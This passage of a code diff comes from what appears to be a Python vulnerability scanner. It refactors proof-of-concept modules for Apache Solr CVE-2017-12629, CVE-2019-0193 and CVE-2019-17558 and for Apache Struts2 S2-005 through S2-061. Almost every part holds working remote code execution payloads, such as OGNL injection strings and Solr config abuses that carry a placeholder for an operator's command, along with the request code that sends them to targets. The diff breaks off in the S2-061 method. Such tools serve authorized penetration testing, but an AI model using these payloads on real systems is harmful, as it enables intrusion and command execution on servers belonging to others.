             verify.connection_output(self.pocname)
         except Exception as error:
             verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info)
+        self.threadLock.release()
             
 class ApacheSolr():
     def __init__(self, url):
         self.url = url
+        self.threadLock = threading.Lock()
         # Change the url format to conform to the program
         self.getipport = urlparse(self.url)
         self.hostname = self.getipport.hostname
@@ -769,7 +1033,6 @@ class ApacheSolr():
             self.port = 443
         elif self.port == None and r"http://" in self.url:
             self.port = 80
-        
         if r"https://" in self.url:
             self.url = "https://"+self.hostname+":"+str(self.port)
         if r"http://" in self.url:
@@ -793,6 +1056,7 @@ class ApacheSolr():
             "()))%23end"
 
     def cve_2017_12629(self):
+        self.threadLock.acquire()
         self.pocname = "Apache Solr: CVE-2017-12629"
         self.corename = "null"
         self.newcore = ''.join(random.choices(string.ascii_letters+string.digits, k=6))
@@ -805,30 +1069,31 @@ class ApacheSolr():
         self.headers_solr1 = {
             'Host': "localhost",
             'Accept': "*/*",
-            'User-Agent': "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)",
+            'User-Agent': USER_AGENT,
             'Connection': "close"
         }
         self.headers_solr2 = {
             'Host': "localhost",
             'ccept-Language': "en",
-            'User-Agent': "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)",
+            'User-Agent': USER_AGENT,
             'Connection': "close",
             'Content-Type': "application/json"
         }
         self.method = "post"
-        self.r = "PoCWating"
         try:
-            self.request = requests.get(url=self.urlcore, headers=headers, timeout=TIMEOUT, verify=False)
+            self.request = requests.get(url=self.urlcore, headers=HEADERS, timeout=TIMEOUT, verify=False)
             try:
                 self.corename = list(json.loads(self.request.text)["status"])[0]
             except:
                 pass
             self.request = requests.post(self.url+"/solr/"+str(self.corename)+"/config", data=self.payload1, headers=self.headers_solr1, timeout=TIMEOUT, verify=False)
-            if self.request.status_code == 200 and self.corename != "null":
+            if self.request.status_code == 200 and self.corename != "null" and self.corename != None:
                 self.r = "PoCSuCCeSS"
+            if VULN is not None:
+                self.r = "Command Executed Successfully (But No Echo)"
             self.request = requests.post(self.url+"/solr/"+str(self.corename)+"/update", data=self.payload2, headers=self.headers_solr2, timeout=TIMEOUT, verify=False)
             self.rawdata = dump.dump_all(self.request).decode('utf-8','ignore')
-            self.info = color.rce()+color.green(" [newcore:"+self.newcore+"] ")
+            self.info = color.rce() + " [newcore:"+self.newcore+"] "
             verify.generic_output(self.r, self.pocname, self.method, self.rawdata, self.info)
         except requests.exceptions.Timeout as error:
             verify.timeout_output(self.pocname)
@@ -836,8 +1101,10 @@ class ApacheSolr():
             verify.connection_output(self.pocname)
         except Exception as error:
             verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info)
+        self.threadLock.release()
 
     def cve_2019_0193(self):
+        self.threadLock.acquire()
         self.pocname = "Apache Solr: CVE-2019-0193"
         self.corename = "null"
         self.info = None
@@ -847,7 +1114,7 @@ class ApacheSolr():
         self.solrhost = self.hostname + ":" + str(self.port)
         self.headers = {
             'Host': ""+self.solrhost,
-            'User-Agent': "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)",
+            'User-Agent': USER_AGENT,
             'Accept': "application/json, text/plain, */*",
             'Accept-Language': "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
             'Accept-Encoding': "zip, deflate",
@@ -859,16 +1126,16 @@ class ApacheSolr():
         self.urlcore = self.url+"/solr/admin/cores?indexInfo=false&wt=json"
         self.rawdata = "null"
         try:
-            self.request = requests.get(url=self.urlcore, headers=headers, timeout=TIMEOUT, verify=False)
+            self.request = requests.get(url=self.urlcore, headers=HEADERS, timeout=TIMEOUT, verify=False)
             try:
                 self.corename = list(json.loads(self.request.text)["status"])[0]
             except:
                 pass
             self.urlconfig = self.url+"/solr/"+str(self.corename)+"/admin/mbeans?cat=QUERY&wt=json"
             # check solr mode: "solr.handler.dataimport.DataImportHandler"
-            self.request = requests.get(url=self.urlconfig, headers=headers, timeout=TIMEOUT, verify=False)
+            self.request = requests.get(url=self.urlconfig, headers=HEADERS, timeout=TIMEOUT, verify=False)
             self.urlcmd = self.url+"/solr/"+str(self.corename)+"/dataimport"
-            self.request = requests.post(self.urlcmd, data=self.payload, headers=headers, timeout=TIMEOUT, verify=False)
+            self.request = requests.post(self.urlcmd, data=self.payload, headers=HEADERS, timeout=TIMEOUT, verify=False)
             if self.request.status_code==200 and self.corename!="null":
                 self.r = "PoCSuCCeSS"
             self.rawdata = dump.dump_all(self.request).decode('utf-8','ignore')
@@ -880,8 +1147,10 @@ class ApacheSolr():
             verify.connection_output(self.pocname)
         except Exception as error:
             verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info)
+        self.threadLock.release()
 
     def cve_2019_17558(self):
+        self.threadLock.acquire()
         self.pocname = "Apache Solr: CVE-2019-17558"
         self.corename = None
         self.payload_1 = self.payload_cve_2019_17558.replace("RECOMMAND","id")
@@ -891,14 +1160,14 @@ class ApacheSolr():
         self.rawdata = None
         self.r = "PoCWating"
         try:
-            self.request = requests.get(url=self.urlcore, timeout=TIMEOUT, verify=False)
+            self.request = requests.get(url=self.urlcore, headers=HEADERS, timeout=TIMEOUT, verify=False)
             try:
                 self.corename = list(json.loads(self.request.text)["status"])[0]
             except:
                 pass
-            self.info = color.rce()+color.green(" [corename:"+str(self.corename)+"]")
+            self.info = color.rce()+" [corename:"+str(self.corename)+"]"
             self.urlapi = self.url+"/solr/"+str(self.corename)+"/config"
-            self.headers_json = {'Content-Type': 'application/json'}
+            self.headers_json = {'Content-Type': 'application/json', 'User-Agent': USER_AGENT}
             self.set_api_data = """
             {
               "update-queryresponsewriter": {
@@ -921,8 +1190,8 @@ class ApacheSolr():
                     verify.generic_output(self.r, self.pocname, self.method, self.rawdata, self.info)
             else:
                 self.request = requests.post(self.urlapi, data=self.set_api_data, headers=self.headers_json, timeout=TIMEOUT, verify=False)
+                self.request = requests.get(self.url+"/solr/"+str(self.corename)+self.payload_2, headers=HEADERS, timeout=TIMEOUT, verify=False)
                 self.rawdata = dump.dump_all(self.request).decode('utf-8','ignore')
-                self.request = requests.get(self.url+"/solr/"+str(self.corename)+self.payload_2, timeout=TIMEOUT, verify=False)
                 verify.generic_output(self.request.text, self.pocname, self.method, self.rawdata, self.info)
         except requests.exceptions.Timeout as error:
             verify.timeout_output(self.pocname)
@@ -930,10 +1199,11 @@ class ApacheSolr():
             verify.connection_output(self.pocname)
         except Exception as error:
             verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info)
-
+        self.threadLock.release()
 
 class ApacheStruts2():
     def __init__(self, url):
+        self.threadLock = threading.Lock()
         http.client.HTTPConnection._http_vsn_str = 'HTTP/1.0'
         self.url=url
         self.payload_s2_005 = r"('\43_memberAccess.allowStaticMethodAccess')(a)=true&(b)(('\43context[\'xwork.Method" \
@@ -990,7 +1260,7 @@ class ApacheStruts2():
             "GlzcCUyNyUyYiUyN2F0Y2hlci5IdHRwU2VyJTI3JTJiJTI3dmxldFJlcyUyNyUyYiUyN3BvbnNlJTI3KSwlMjNyZXNwLnNldENoYXJh" 
             "Y3RlckVuY29kaW5nKCUyN1VURi04JTI3KSwlMjNyZXNwLmdldFdyaXRlcigpLnByaW50bG4oJTIzc3RyKSwlMjNyZXNwLmdldFdyaXR" 
             "lcigpLmZsdXNoKCksJTIzcmVzcC5nZXRXcml0ZXIoKS5jbG9zZSgpfQ==")
-        self.payload_s2_029 = r"=(%23_memberAccess[%27allowPrivateAccess%27]=true,%23_memberAccess[%27allowProtected" \
+        self.payload_s2_029 = r"(%23_memberAccess[%27allowPrivateAccess%27]=true,%23_memberAccess[%27allowProtected" \
             r"Access%27]=true,%23_memberAccess[%27excludedPackageNamePatterns%27]=%23_memberAccess[%27acceptProperti" \
             r"es%27],%23_memberAccess[%27excludedClasses%27]=%23_memberAccess[%27acceptProperties%27],%23_memberAcce" \
             r"ss[%27allowPackageProtectedAccess%27]=true,%23_memberAccess[%27allowStaticMethodAccess%27]=true,@org.a" \
@@ -1104,25 +1374,31 @@ class ApacheStruts2():
             r"3a.exec('RECOMMAND').getInputStream()).useDelimiter('%5C%5C%5C" \
             r"%5CA')%2C%23str%3D%23s.hasNext()%3F%23s.next()%3A''%2C%23res.p" \
             r"rint(%23str)%2C%23res.close()%0A%7d"
-        #self.payload_s2_061 = r"""%{(#instancemanager=#application["org.apache.tomcat.InstanceManager"]).(#stack=#attr["com.opensymphony.xwork2.util.ValueStack.ValueStack"]).(#bean=#instancemanager.newInstance("org.apache.commons.collections.BeanMap")).(#bean.setBean(#stack)).(#context=#bean.get("context")).(#bean.setBean(#context)).(#macc=#bean.get("memberAccess")).(#bean.setBean(#macc)).(#emptyset=#instancemanager.newInstance("java.util.HashSet")).(#bean.put("excludedClasses",#emptyset)).(#bean.put("excludedPackageNames",#emptyset)).(#arglist=#instancemanager.newInstance("java.util.ArrayList")).(#arglist.add("RECOMMAND")).(#execute=#instancemanager.newInstance("freemarker.template.utility.Execute")).(#execute.exec(#arglist))}"""
-        #self.payload_s2_061 = '%25%7b(%27Powered_by_Unicode_Potats0%2cenjoy_it%27).(%23UnicodeSec+%3d+%23application%5b%27org.apache.tomcat.InstanceManager%27%5d).(%23potats0%3d%23UnicodeSec.newInstance(%27org.apache.commons.collections.BeanMap%27)).(%23stackvalue%3d%23attr%5b%27struts.valueStack%27%5d).(%23potats0.setBean(%23stackvalue)).(%23context%3d%23potats0.get(%27context%27)).(%23potats0.setBean(%23context)).(%23sm%3d%23potats0.get(%27memberAccess%27)).(%23emptySet%3d%23UnicodeSec.newInstance(%27java.util.HashSet%27)).(%23potats0.setBean(%23sm)).(%23potats0.put(%27excludedClasses%27%2c%23emptySet)).(%23potats0.put(%27excludedPackageNames%27%2c%23emptySet)).(%23exec%3d%23UnicodeSec.newInstance(%27freemarker.template.utility.Execute%27)).(%23cmd%3d%7b%27"RECOMMAND"%27%7d).(%23res%3d%23exec.exec(%23cmd))%7d'
-        self.payload_s2_061 = r"""%25%7b(%27Powered_by_Unicode_Potats0%2cenjoy_it%27).(%23UnicodeSec+%3d+%23application%5b%27org.apache.tomcat.InstanceManager%27%5d).(%23potats0%3d%23UnicodeSec.newInstance(%27org.apache.commons.collections.BeanMap%27)).(%23stackvalue%3d%23attr%5b%27struts.valueStack%27%5d).(%23potats0.setBean(%23stackvalue)).(%23context%3d%23potats0.get(%27context%27)).(%23potats0.setBean(%23context)).(%23sm%3d%23potats0.get(%27memberAccess%27)).(%23emptySet%3d%23UnicodeSec.newInstance(%27java.util.HashSet%27)).(%23potats0.setBean(%23sm)).(%23potats0.put(%27excludedClasses%27%2c%23emptySet)).(%23potats0.put(%27excludedPackageNames%27%2c%23emptySet)).(%23exec%3d%23UnicodeSec.newInstance(%27freemarker.template.utility.Execute%27)).(%23cmd%3d%7b%27RECOMMAND%27%7d).(%23res%3d%23exec.exec(%23cmd))%7d"""
+        self.payload_s2_061 = """%25%7b(%27Powered_by_Unicode_Potats0%2cenjoy_it%27).""" \
+            """(%23UnicodeSec+%3d+%23application%5b%27org.apache.tomcat.InstanceManager%27%5d).""" \
+            """(%23potats0%3d%23UnicodeSec.newInstance(%27org.apache.commons.collections.BeanMap%27)).""" \
+            """(%23stackvalue%3d%23attr%5b%27struts.valueStack%27%5d).(%23potats0.setBean(%23stackvalue)).""" \
+            """(%23context%3d%23potats0.get(%27context%27)).(%23potats0.setBean(%23context)).(%23sm%3d%23potats0.""" \
+            """get(%27memberAccess%27)).(%23emptySet%3d%23UnicodeSec.newInstance(%27java.util.HashSet%27)).""" \
+            """(%23potats0.setBean(%23sm)).(%23potats0.put(%27excludedClasses%27%2c%23emptySet)).""" \
+            """(%23potats0.put(%27excludedPackageNames%27%2c%23emptySet)).""" \
+            """(%23exec%3d%23UnicodeSec.newInstance(%27freemarker.template.utility.Execute%27)).""" \
+            """(%23cmd%3d%7b%27RECOMMAND%27%7d).(%23res%3d%23exec.exec(%23cmd))%7d"""
         self.payload_s2_devMode = r"?debug=browser&object=(%23_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)" \
             r"%3F(%23context%5B%23parameters.rpsobj%5B0%5D%5D.getWriter().println(@org.apache.commons.io.IOUtils@toS" \
             r"tring(@java.lang.Runtime@getRuntime().exec(%23parameters.command%5B0%5D).getInputStream()))):sb.toStri" \
             r"ng.json&rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&command=RECOMMAND"
 
-
-
     def s2_005(self):
+        self.threadLock.acquire()
         self.pocname = "Apache Struts2: S2-005"
-        self.payload = self.payload_s2_005.replace("RECOMMAND",CMD)
+        self.payload = self.payload_s2_005.replace("RECOMMAND", CMD)
         self.rawdata = "null"
         self.method = "post"
         self.info = color.rce()
         try:
-            self.request = requests.post(self.url, headers=headers, data=self.payload, timeout=TIMEOUT, verify=False)
-            self.rawdata = dump.dump_all(self.request).decode('utf-8','ignore')
+            self.request = requests.post(self.url, headers=HEADERS, data=self.payload, timeout=TIMEOUT, verify=False)
+            self.rawdata = dump.dump_all(self.request).decode('utf-8', 'ignore')
             verify.generic_output(self.request.text, self.pocname, self.method, self.rawdata, self.info)
         except requests.exceptions.Timeout as error:
             verify.timeout_output(self.pocname)
@@ -1130,76 +1406,86 @@ class ApacheStruts2():
             verify.connection_output(self.pocname)
         except Exception as error:
             verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info)
-            
+        self.threadLock.release()
+
     def s2_008(self):
+        self.threadLock.acquire()
         self.pocname = "Apache Struts2: S2-008"
         self.payload = self.payload_s2_008.replace("RECOMMAND", CMD)
         self.rawdata = "null"
         self.method = "get"
         self.info = color.rce()
         try:
-            self.request = requests.get(self.url+self.payload, headers=headers, timeout=TIMEOUT, verify=False)
-            self.rawdata = dump.dump_all(self.request).decode('utf-8','ignore')
+            self.request = requests.get(self.url + self.payload, headers=HEADERS, timeout=TIMEOUT, verify=False)
+            self.rawdata = dump.dump_all(self.request).decode('utf-8', 'ignore')
             verify.generic_output(self.request.text, self.pocname, self.method, self.rawdata, self.info)
         except requests.exceptions.Timeout as error:
             verify.timeout_output(self.pocname)
         except requests.exceptions.ConnectionError as error:
             verify.connection_output(self.pocname)
         except Exception as error:
-            verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info)          
+            verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info)
+        self.threadLock.release()
 
     def s2_009(self):
+        self.threadLock.acquire()
         self.pocname = "Apache Struts2: S2-009"
         self.rawdata = "null"
         self.method = "post"
         self.payload = self.payload_s2_009.replace("RECOMMAND", CMD)
         self.info = color.rce()
         try:
-            self.request=requests.post(self.url, data=self.payload, headers=headers, timeout=TIMEOUT, verify=False)
-            self.rawdata = dump.dump_all(self.request).decode('utf-8','ignore')
+            self.request = requests.post(self.url, data=self.payload, headers=HEADERS, timeout=TIMEOUT, verify=False)
+            self.rawdata = dump.dump_all(self.request).decode('utf-8', 'ignore')
             verify.generic_output(self.request.text, self.pocname, self.method, self.rawdata, self.info)
         except requests.exceptions.Timeout as error:
             verify.timeout_output(self.pocname)
         except requests.exceptions.ConnectionError as error:
             verify.connection_output(self.pocname)
         except Exception as error:
-            verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info)    
+            verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info)
+        self.threadLock.release()
 
     def s2_013(self):
+        self.threadLock.acquire()
         self.pocname = "Apache Struts2: S2-013"
         self.method = "get"
         self.rawdata = "null"
         self.payload = self.payload_s2_013.replace("RECOMMAND", CMD)
         self.info = color.rce()
         try:
-            self.request=requests.get(self.url+self.payload, headers=headers, timeout=TIMEOUT, verify=False)
-            self.rawdata = dump.dump_all(self.request).decode('utf-8','ignore')
+            self.request = requests.get(self.url + self.payload, headers=HEADERS, timeout=TIMEOUT, verify=False)
+            self.rawdata = dump.dump_all(self.request).decode('utf-8', 'ignore')
             verify.generic_output(self.request.text, self.pocname, self.method, self.rawdata, self.info)
         except requests.exceptions.Timeout as error:
             verify.timeout_output(self.pocname)
         except requests.exceptions.ConnectionError as error:
             verify.connection_output(self.pocname)
         except Exception as error:
-            verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info)  
+            verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info)
+        self.threadLock.release()
 
     def s2_015(self):
+        self.threadLock.acquire()
         self.pocname = "Apache Struts2: S2-015"
         self.method = "get"
         self.payload = self.payload_s2_015.replace("RECOMMAND", CMD)
         self.rawdata = "null"
         self.info = color.rce()
         try:
-            self.request = requests.get(self.url+self.payload, headers=headers, timeout=TIMEOUT, verify=False)
-            self.rawdata = dump.dump_all(self.request).decode('utf-8','ignore')
+            self.request = requests.get(self.url + self.payload, headers=HEADERS, timeout=TIMEOUT, verify=False)
+            self.rawdata = dump.dump_all(self.request).decode('utf-8', 'ignore')
             verify.generic_output(self.request.text, self.pocname, self.method, self.rawdata, self.info)
         except requests.exceptions.Timeout as error:
             verify.timeout_output(self.pocname)
         except requests.exceptions.ConnectionError as error:
             verify.connection_output(self.pocname)
         except Exception as error:
-            verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info)  
+            verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info)
+        self.threadLock.release()
 
     def s2_016(self):
+        self.threadLock.acquire()
         self.pocname = "Apache Struts2: S2-016"
         self.payload_1 = self.payload_s2_016_1.replace("RECOMMAND", CMD)
         self.payload_2 = self.payload_s2_016_2
@@ -1207,62 +1493,70 @@ class ApacheStruts2():
         self.info = color.rce()
         self.method = "get"
         try:
-            self.request = requests.get(self.url+self.payload_1, headers=headers, timeout=TIMEOUT, verify=False)
-            self.rawdata = dump.dump_all(self.request).decode('utf-8','ignore')
+            self.request = requests.get(self.url + self.payload_1, headers=HEADERS, timeout=TIMEOUT, verify=False)
+            self.rawdata = dump.dump_all(self.request).decode('utf-8', 'ignore')
             verify.generic_output(self.request.text, self.pocname, self.method, self.rawdata, self.info)
         except requests.exceptions.Timeout as error:
             verify.timeout_output(self.pocname)
         except requests.exceptions.ConnectionError as error:
             verify.connection_output(self.pocname)
         except Exception as error:
-            verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info) 
+            verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info)
+        self.threadLock.release()
 
     def s2_029(self):
+        self.threadLock.acquire()
         self.pocname = "Apache Struts2: S2-029"
         self.payload = self.payload_s2_029.replace("RECOMMAND", CMD)
         self.method = "get"
         self.rawdata = "null"
         self.info = color.rce()
+        if r"?" not in self.url:
+            self.url_029 = self.url + "?id="
         try:
-            self.request = requests.get(self.url+self.payload, headers=headers, timeout=TIMEOUT, verify=False)
-            self.rawdata = dump.dump_all(self.request).decode('utf-8','ignore')
+            self.request = requests.get(self.url_029 + self.payload, headers=HEADERS, timeout=TIMEOUT, verify=False)
+            self.rawdata = dump.dump_all(self.request).decode('utf-8', 'ignore')
             verify.generic_output(self.request.text, self.pocname, self.method, self.rawdata, self.info)
         except requests.exceptions.Timeout as error:
             verify.timeout_output(self.pocname)
         except requests.exceptions.ConnectionError as error:
             verify.connection_output(self.pocname)
         except Exception as error:
-            verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info)  
+            verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info)
+        self.threadLock.release()
 
     def s2_032(self):
+        self.threadLock.acquire()
         self.pocname = "Apache Struts2: S2-032"
-        self.payload = self.payload_s2_032.replace("RECOMMAND",CMD)
+        self.payload = self.payload_s2_032.replace("RECOMMAND", CMD)
         self.method = "get"
         self.rawdata = "null"
         self.info = color.rce()
         try:
-            self.request = requests.get(self.url+self.payload, headers=headers, timeout=TIMEOUT, verify=False)
-            self.rawdata = dump.dump_all(self.request).decode('utf-8','ignore')
+            self.request = requests.get(self.url + self.payload, headers=HEADERS, timeout=TIMEOUT, verify=False)
+            self.rawdata = dump.dump_all(self.request).decode('utf-8', 'ignore')
             verify.generic_output(self.request.text, self.pocname, self.method, self.rawdata, self.info)
         except requests.exceptions.Timeout as error:
             verify.timeout_output(self.pocname)
         except requests.exceptions.ConnectionError as error:
             verify.connection_output(self.pocname)
         except Exception as error:
-            verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info)  
+            verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info)
+        self.threadLock.release()
 
     def s2_045(self):
+        self.threadLock.acquire()
         self.pocname = "Apache Struts2: S2-045"
         self.page = "null"
         self.vuln_number = 0
         self.method = "get"
         self.headers1 = {
-            'User-Agent': 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)',
-            'Content-Type': '${#context["com.opensymphony.xwork2.dispatcher.HttpServletResponse"].' 
-                'addHeader("FUCK",233*233)}.multipart/form-data'
+            'User-Agent': USER_AGENT,
+            'Content-Type': '${#context["com.opensymphony.xwork2.dispatcher.HttpServletResponse"].'
+                            'addHeader("FUCK",233*233)}.multipart/form-data'
         }
         self.headers2 = {
-            'User-Agent': 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)',
+            'User-Agent': USER_AGENT,
             'Content-Type': self.payload_s2_045.replace("RECOMMAND", CMD)
         }
         self.rawdata = "null"
@@ -1273,7 +1567,7 @@ class ApacheStruts2():
                 if r"54289" in self.request.headers['FUCK']:
                     vuln_number = 1
                     self.fuck045 = self.request.headers['FUCK']
-                    self.rawdata = dump.dump_all(self.request).decode('utf-8','ignore')
+                    self.rawdata = dump.dump_all(self.request).decode('utf-8', 'ignore')
                     verify.generic_output(self.fuck045, self.pocname, self.method, self.rawdata, self.info)
                 else:
                     try:
@@ -1290,7 +1584,7 @@ class ApacheStruts2():
                         else:
                             verify.generic_output(self.text045, self.pocname, self.method, self.rawdata, self.info)
                     try:
-                        self.r = self.page.decode("utf-8")  
+                        self.r = self.page.decode("utf-8")
                     except:
                         self.r = self.page.decode("gbk")
                     else:
@@ -1302,8 +1596,8 @@ class ApacheStruts2():
                     self.page = urllib.request.urlopen(self.request, timeout=TIMEOUT).read()
                 except http.client.IncompleteRead as error:
                     self.page = error.partial
-                    self.r = self.page.decode("utf-8")  
-                    print (self.r)
+                    self.r = self.page.decode("utf-8")
+                    print(self.r)
                     verify.generic_output(self.page, self.pocname, self.method, self.rawdata, self.info)
                 except Exception as error:
                     self.text045 = str(error)
@@ -1315,96 +1609,106 @@ class ApacheStruts2():
                         # print ("?")
                         verify.generic_output(self.text045, self.pocname, self.method, self.rawdata, self.info)
                 try:
-                    self.r = self.page.decode("utf-8")  
+                    self.r = self.page.decode("utf-8")
                 except:
                     self.r = self.page.decode("gbk")
                 else:
                     self.r = bytes.decode(self.page)
-                verify.generic_output(self.r, self.pocname, self.method, self.rawdata, self.info)                        
+                verify.generic_output(self.r, self.pocname, self.method, self.rawdata, self.info)
         except requests.exceptions.Timeout as error:
             verify.timeout_output(self.pocname)
         except requests.exceptions.ConnectionError as error:
             verify.connection_output(self.pocname)
         except Exception as error:
-            verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info) 
+            verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info)
+        self.threadLock.release()
 
     def s2_046(self):
+        self.threadLock.acquire()
         self.pocname = "Apache Struts2: S2-046"
         self.headers = {
-            'User-Agent': 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)',
-            'Content-Type':'multipart/form-data; boundary=---------------------------'
+            'User-Agent': USER_AGENT,
+            'Content-Type': 'multipart/form-data; boundary=---------------------------'
         }
         self.rawdata = "null"
         self.info = color.rce()
         self.method = "post"
-        self.payload = self.payload_s2_046.replace("RECOMMAND",CMD)
+        self.payload = self.payload_s2_046.replace("RECOMMAND", CMD)
         try:
-            self.request = requests.post(self.url, data=self.payload, headers=self.headers, timeout=TIMEOUT, verify=False)
-            self.rawdata = dump.dump_all(self.request).decode('utf-8','ignore')
+            self.request = requests.post(self.url, data=self.payload, headers=self.headers, timeout=TIMEOUT,
+                                         verify=False)
+            self.rawdata = dump.dump_all(self.request).decode('utf-8', 'ignore')
             verify.generic_output(self.request.text, self.pocname, self.method, self.rawdata, self.info)
         except requests.exceptions.Timeout as error:
             verify.timeout_output(self.pocname)
         except requests.exceptions.ConnectionError as error:
             verify.connection_output(self.pocname)
         except Exception as error:
-            verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info) 
+            verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info)
+        self.threadLock.release()
 
     def s2_048(self):
+        self.threadLock.acquire()
         self.pocname = "Apache Struts2: S2-048"
         self.method = "post"
         self.rawdata = "null"
         self.info = color.rce()
         self.method = "post"
         if r"saveGangster.action" not in self.url:
-            self.u = self.url+"/integration/saveGangster.action"
+            self.u = self.url + "/integration/saveGangster.action"
         self.data = {
-            'name': self.payload_s2_048.replace("RECOMMAND",CMD),
+            'name': self.payload_s2_048.replace("RECOMMAND", CMD),
             'age': '233',
             '__checkbox_bustedBefore': 'true',
             'description': '233'
         }
         try:
-            self.request = requests.post(self.u, data=self.data, headers=headers, timeout=TIMEOUT, verify=False)
-            self.rawdata = dump.dump_all(self.request).decode('utf-8','ignore')
+            self.request = requests.post(self.u, data=self.data, headers=HEADERS, timeout=TIMEOUT, verify=False)
+            self.rawdata = dump.dump_all(self.request).decode('utf-8', 'ignore')
             verify.generic_output(self.request.text, self.pocname, self.method, self.rawdata, self.info)
         except requests.exceptions.Timeout as error:
             verify.timeout_output(self.pocname)
         except requests.exceptions.ConnectionError as error:
             verify.connection_output(self.pocname)
         except Exception as error:
-            verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info) 
+            verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info)
+        self.threadLock.release()
 
     def s2_052(self):
+        self.threadLock.acquire()
         self.pocname = "Apache Struts2: S2-052"
-        self.payload = self.payload_s2_052.replace("RECOMMAND",CMD)
+        self.payload = self.payload_s2_052.replace("RECOMMAND", CMD)
         self.method = "post"
         self.rawdata = "null"
         self.info = color.rce()
         self.headers = {
             'Accept': 'text/html, application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
-            'User-agent': 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)',
+            'User-agent': USER_AGENT,
             'Content-Type': 'application/xml'
         }
         try:
-            self.request = requests.post(self.url, data=self.payload, headers=self.headers, timeout=TIMEOUT, verify=False)
-            self.rawdata = dump.dump_all(self.request).decode('utf-8','ignore')
+            self.request = requests.post(self.url, data=self.payload, headers=self.headers, timeout=TIMEOUT,
+                                         verify=False)
+            self.rawdata = dump.dump_all(self.request).decode('utf-8', 'ignore')
             verify.generic_output(self.request.text, self.pocname, self.method, self.rawdata, self.info)
         except requests.exceptions.Timeout as error:
             verify.timeout_output(self.pocname)
         except requests.exceptions.ConnectionError as error:
             verify.connection_output(self.pocname)
         except Exception as error:
-            verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info) 
+            verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info)
+        self.threadLock.release()
 
     def s2_057(self):
+        self.threadLock.acquire()
         self.pocname = "Apache Struts2: S2-057"
         self.method = "get"
         self.rawdata = "null"
         self.info = color.rce()
-        self.payload = self.payload_s2_057.replace("RECOMMAND",CMD)
+        self.payload = self.payload_s2_057.replace("RECOMMAND", CMD)
         try:
-            self.request = requests.get(self.url+self.payload, headers=headers, timeout=TIMEOUT, verify=False)
-            self.rawdata = dump.dump_all(self.request).decode('utf-8','ignore')
+            self.request = requests.get(self.url + self.payload, headers=HEADERS, timeout=TIMEOUT, verify=False)
+            self.rawdata = dump.dump_all(self.request).decode('utf-8', 'ignore')
             self.page = self.request.text
             self.etree = html.etree
             self.page = self.etree.HTML(self.page)
@@ -1415,19 +1719,21 @@ class ApacheStruts2():
         except requests.exceptions.ConnectionError as error:
             verify.connection_output(self.pocname)
         except Exception as error:
-            verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info) 
+            verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info)
+        self.threadLock.release()
 
     def s2_059(self):
+        self.threadLock.acquire()
         self.pocname = "Apache Struts2: S2-059"
         self.method = "post"
         self.rawdata = "null"
         self.info = color.rce()
-        self.payload = self.payload_s2_059.replace("RECOMMAND",CMD)
+        self.payload = self.payload_s2_059.replace("RECOMMAND", CMD)
         if r"?" not in self.url:
-            self.url = self.url + "?id="
+            self.url_059 = self.url + "?id="
         try:
-            self.request = requests.post(self.url, data=self.payload, headers=headers, timeout=TIMEOUT, verify=False)
-            self.rawdata = dump.dump_all(self.request).decode('utf-8','ignore')
+            self.request = requests.post(self.url_059, data=self.payload, headers=HEADERS, timeout=TIMEOUT, verify=False)
+            self.rawdata = dump.dump_all(self.request).decode('utf-8', 'ignore')
             verify.generic_output(self.request.text, self.pocname, self.method, self.rawdata, self.info)
         except requests.exceptions.Timeout as error:
             verify.timeout_output(self.pocname)
@@ -1435,16 +1741,20 @@ class ApacheStruts2():
             verify.connection_output(self.pocname)
         except Exception as error:
             verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info)
+        self.threadLock.release()
 
     def s2_061(self):
+        self.threadLock.acquire()
         self.pocname = "Apache Struts2: S2-061"
         self.method = "get"
         self.rawdata = "null"
         self.info = color.rce()
-        self.payload = self.payload_s2_061.replace("RECOMMAND",CMD)
+        self.payload = self.payload_s2_061.replace("RECOMMAND", CMD)
+        if r"?" not in self.url:
+            self.url_061 = self.url + "?id="
         try:
-            self.request = requests.get(self.url+self.payload, headers=headers, timeout=TIMEOUT, verify=False)
